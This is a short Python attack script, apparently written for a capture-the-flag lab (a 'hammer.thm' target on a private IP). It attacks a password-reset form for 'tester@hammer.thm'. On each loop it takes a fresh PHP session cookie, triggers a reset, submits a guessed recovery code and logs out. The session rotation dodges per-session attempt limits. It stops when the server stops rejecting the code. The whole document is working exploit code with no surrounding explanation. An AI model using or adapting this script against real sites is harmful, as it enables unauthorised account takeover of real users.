import requests

URL = 'http://10.82.129.124:1337'
RESET_PHP = '/reset_password.php'
LOGOUT_PHP = '/logout.php'
CODE = '1337'
EMAIL = 'tester@hammer.thm'

while True:
    header = {
    'Content-Type': 'application/x-www-form-urlencoded',
    }
    # Send a get request to set cookie
    res_get_page = requests.get(URL + RESET_PHP, headers=header)
    set_cookie = res_get_page.headers.get("Set-Cookie")

    header['Cookie'] = 'PHPSESSID=' + set_cookie.split(';')[0].split('=')[1]


    # Send a reset password link
    data_reset = 'email='+EMAIL
    res_reset_email = requests.post(URL + RESET_PHP,data_reset, headers=header)

    # Send test code
    data_code = 'recovery_code=1337&s=177'
    res_recovery_code = requests.post(URL + RESET_PHP, data_code, headers=header)
    print('TESTING:',res_recovery_code.request.headers['Cookie'])
    if 'Invalid or expired recovery code!' not in res_recovery_code.text:
        print('valid response:',res_recovery_code.content)
        exit(0)

    # Send Logout
    requests.get(URL + LOGOUT_PHP, headers=header)

